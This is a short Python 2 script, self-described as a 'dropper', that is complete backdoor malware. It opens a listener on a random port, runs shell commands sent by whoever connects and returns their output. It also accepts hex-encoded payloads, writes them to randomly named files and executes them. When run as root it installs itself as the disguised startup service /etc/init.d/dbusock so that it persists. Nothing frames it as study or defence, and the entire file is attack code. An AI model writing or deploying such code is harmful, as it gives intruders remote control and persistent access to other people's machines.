#!/usr/bin/python2

import socket
import subprocess
import os
import random
import string
import sys

port = ''.join(random.choice(string.digits) for _ in range(4))

if os.geteuid() != 0:
	print "[!] you are not executing the dropper as root, there may be some problems later on"

def main():
	print "[+] port being bound to target machine {0}".format(port)
	socket_ = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	socket_.bind(('', int(float(port))))
	socket_.listen(1)
	conn, addr = socket_.accept()
	data=conn.recv(1024)
	spawned = ""
	while True:
		if not data:
			break
		if data == "kill":
			sys.exit()
		if data == "spawn_shell" or data.startswith("shell-com:"):
			spawned = "y"
			print data
			if data == "quit": break
			p = subprocess.Popen(data.replace("shell-com:",""), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			stdout_=p.stdout.read() + p.stderr.read()
			conn.send(stdout_)
		if not data.startswith("shell-com:"):
			conn.sendall(data)
			plain_data = data.decode("hex")
			print plain_data
			payload_drop = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))
			open(payload_drop,"w").write(plain_data)
			subprocess.Popen(["chmod","+x",payload_drop]).wait()
			subprocess.Popen(["dos2unix",payload_drop])
			os.system("./{0}".format(payload_drop))
			os.unlink(payload_drop)
		socket_.close()
	if os.path.exists("/etc/init.d") and os.geteuid() == 0 and not os.path.exists("/etc/init.d/dbusock"):
		print "[+] adding dropper script to /etc/init.d/dbusock as to remain persistent"
		p = open(sys.argv[0].replace("./",""),"r").read()
		open("/etc/init.d/dbusock","w").write(p)
		subprocess.Popen(["chmod","+x","/etc/init.d/dbusock"])
		print("[+] dropper will now start on startup as dbusock")

if __name__ == "__main__":
	main()
